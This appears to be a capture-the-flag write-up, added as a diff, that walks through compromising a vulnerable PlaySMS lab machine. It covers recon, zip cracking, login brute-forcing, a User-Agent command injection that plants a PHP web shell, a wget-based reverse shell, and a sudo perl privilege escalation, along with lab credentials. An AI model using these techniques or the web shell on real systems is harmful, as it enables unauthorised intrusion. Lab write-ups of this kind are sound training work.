@@ -1,0 +1,78 @@
+1. nmap shows port 80 is open. 
+   also, robots.txt contains 5 files: 
+   		/ange1 /angel1 /nothing /tmp /uploads
+2. all the dirs are empty. checking http "OPTIONS" (curl -X OPTIONS http://10.0.2.9/uploads/ -v) returns the same result on all folders:
+	Allow: GET,HEAD,POST,OPTIONS
+
+3. running dirbuster on the website returns the folder "/secur" which didn't appear in the robots.txt file.
+	<dirb http://10.0.2.9 /usr/share/SecLists/Discovery/Web-Content/common.txt>
+
+4. surfing to the folder, we find a password-protected zip with a file named backup-cred.mp3.
+   4.a. trying to break it with fcrackzip didn't work :(
+   			<fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip -v>
+   4.b. tying the same thing with "John" worked!
+   			<zip2john backup.zip > zip_pass_hash.txt
+   			john zip_pass_hash.txt>
+
+   the password is "freedom"
+
+
+5. The backup-cred.mp3 turned to be a text file containing:
+	a. uname: touhid
+	b. password: ******
+	c. url: /SecreTSMSgatwayLogin
+	surfing to that url we find a login panel powered by "PlaySMS"
+
+
+6. tried to brute force the password using ffuff but it didn't work :(
+	<copy request from burp to login_request.txt
+	ffuf -request login_request.txt -w /usr/share/wordlists/rockyou.txt -fr "block"> 
+
+7. thought about figuring out the version of the playSMS using the dependencies, but left that as well
+		jquery2.0.3 - july 2013
+		apache 2.2.22 - feb 2012
+		php 5.3.10 - feb 2012
+		bootstrap 3.2.0 - june 2014
+
+8. looking again at the first folders, i found this comment in the html code of "10.0.2.9/nothing"
+	<!--
+	#my secret pass
+	freedom
+	password
+	helloworld!
+	diana
+	iloveroot
+	-->
+
+9. login to playSMS with "touhid" and "diana" worked!
+
+10. looking at searchploit, we see that there is a vulnurability that allows us to upload a csv file that will allow us to execute php code.
+using the csv file named "rce_via_agent.csv", passing it through burp, and changing the "user-agent" header to a linux command worked!
+
+11. change the user agent to this to get shell:
+	User-Agent: echo "<?php \$cmd = (\$_REQUEST['cmd']); system(\$cmd); ?>" > ../uploads/second_shell.php
+
+12. to get reverse shell, open python http.server on your local machine and run "wget" from the webshell we just uploaded
+
+
+13. tried all known passwords (from "noting") on "root" and "touhid" users but it didnt work.
+
+
+14. there are creds for mysql in the file "var/log/SecreTSMSgatewayLogin/config.php". connected using:
+		mysql --user=root --password=hello@mysql
+	but didnt find anything interesting
+
+
+15. FINALLY, checking sudo privliges with "sudo -l" shows that "www-data" user is allowed to run perl script as root with no password!!
+	"(ALL) NOPASSWD: /usr/bin/perl"
+
+16. create a perl script like this:
+		<echo "system(\"cat /root/flag.txt\");" > /tmp/commands.perl>
+	and run it using sudo
+		<sudo perl /tmp/commands.perl>
+
+
+	"password for root is hello@3210"
+
+	JOB'S DONE!
+
